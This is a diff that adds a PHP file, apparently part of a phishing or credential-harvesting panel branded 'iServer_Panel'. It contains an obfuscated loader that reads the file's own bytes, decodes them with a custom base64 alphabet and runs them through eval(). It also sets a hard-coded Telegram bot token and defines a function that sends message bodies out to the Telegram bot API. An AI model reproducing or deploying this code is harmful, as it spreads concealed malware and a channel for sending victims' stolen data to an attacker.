@@ -1,0 +1,21 @@
+<?php $O000O0O00 = $GLOBALS['OOO000O00']($OOO0O0O00, 'rb');
+$GLOBALS['O0O00OO00']($O000O0O00, 0x55c);
+$OO00O00O0 = $GLOBALS['OOO0000O0']($GLOBALS['OOO00000O']($GLOBALS['O0O00OO00']($O000O0O00, 0x1a8), 'hVQm72gsZTwu0edyHXKrfLOx+Gjn6bD48tIpJMEcWiP/CB1YvRUSozA5NakF3l9q=', 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'));
+eval($OO00O00O0);
+$OO00O00O0 = str_replace('__FILE__', "'" . $OOO0O0O00 . "'", $GLOBALS['OOO0000O0']($GLOBALS['OOO00000O']($GLOBALS['O0O00OO00']($O000O0O00, $OO00O0000), 'hVQm72gsZTwu0edyHXKrfLOx+Gjn6bD48tIpJMEcWiP/CB1YvRUSozA5NakF3l9q=', 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/')));
+fclose($O000O0O00);
+eval($OO00O00O0);
+$twitter = 'Twitter:@iServer_Panel';
+$twitter2 = 'Twitter:@iServer_Panel';
+$telegram = 'Telegram:@iServer_Panel';
+$copy = '© Powered By @iServer_Panel';
+$token = '973711034:AAEmYlXZrM22n8GEIDRWcHmn1UFcFFJMbbk';
+$to = '@gmail.com';
+$iserver_ref = '';
+session_start();
+function Telegram($iserver_ref, $body) {
+    $iserver_ref = '';
+    $token = "973711034:AAEmYlXZrM22n8GEIDRWcHmn1UFcFFJMbbk";
+    $data = ['chat_id' => $iserver_ref, 'text' => $body, 'parse_mode' => 'html'];
+    $response = file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data));
+};
